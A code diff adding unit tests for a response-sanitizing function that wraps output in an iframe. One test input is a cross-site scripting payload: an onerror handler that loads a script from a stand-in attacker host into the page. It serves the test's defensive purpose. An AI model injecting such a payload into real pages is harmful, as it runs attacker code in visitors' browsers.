@@ -1,4 +1,4 @@
-import { configuredOutputs } from '../utils';
+import { configuredOutputs, sanitizeResponseData } from '../utils';
 
 describe('configuredOutputs', () => {
 	it('returns array of objects when version >= 1.3', () => {
@@ -33,5 +33,26 @@ describe('configuredOutputs', () => {
 	it('returns ["main"] when version  1.4 and !enableResponseOutput', () => {
 		const result = configuredOutputs(1.4, { enableResponseOutput: false });
 		expect(result).toEqual(['main']);
+	});
+});
+
+describe('sanitizeResponseData', () => {
+	test.each([
+		{
+			src: 'https://example.com',
+		},
+		{
+			src: "<source onerror=\"s=document.createElement('script');s.src='http://attacker.com/evil.js';document.body.appendChild(s);\">",
+		},
+	])('wraps the response body in an iframe', ({ src }) => {
+		const result = sanitizeResponseData(src);
+
+		expect(result).toContain('<iframe');
+		expect(result).toContain(`src="${src}"`);
+		expect(result).toContain('width: 100%');
+		expect(result).toContain('height: 100%');
+		expect(result).toContain('allowtransparency="true"');
+		expect(result.trim().startsWith('<iframe')).toBe(true);
+		expect(result.trim().endsWith('</iframe>')).toBe(true);
 	});
 });
